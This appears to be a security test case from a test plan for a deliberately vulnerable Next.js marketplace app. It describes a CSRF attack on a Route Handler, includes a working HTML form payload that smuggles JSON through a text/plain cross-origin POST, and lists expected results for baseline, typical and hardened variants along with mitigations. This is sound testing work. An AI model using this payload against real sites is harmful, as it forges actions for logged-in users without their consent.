# T03 — CSRF on Route Handler

## Wektor ataku
OWASP A05:2021 (Security Misconfiguration). Next.js Route Handlers do NOT have built-in CSRF protection. Cross-origin POST with credentials succeeds if cookie is `SameSite=Lax` (default).

## Setup
1. `git checkout baseline` (only branch where contact uses Route Handler)
2. `pnpm dev`
3. Login as `jan@nextmarket.test` (cookie set)

## Payload
Host `attacker.html` on a different origin (e.g. `python3 -m http.server 8080`):
```html
<form action="http://localhost:3000/api/contact" method="POST" enctype="text/plain">
  <input name='{"listingId":"<id>","recipientId":"<id>","content":"PWNED","senderName":"x","senderEmail":"x@x.com","x":"' value='"}' />
  <input type="submit">
</form>
```
Open `http://localhost:8080/attacker.html`, click submit.

## Expected result per variant
- **baseline:** message inserted into DB despite cross-origin submission
- **typical:** N/A (contact is Server Action, framework adds CSRF token automatically)
- **hardened:** Origin header validated; cross-origin request rejected with 403

## Verification tools
- Burp Suite (replay request with modified Origin)
- Manual cross-origin form

## Mitigation reference
`typical`/`hardened`: `src/lib/actions/contact.ts` (Server Action) + Next.js built-in CSRF token validation.
`hardened` API routes: `src/app/api/listings/route.ts` — `checkOrigin(req)`.
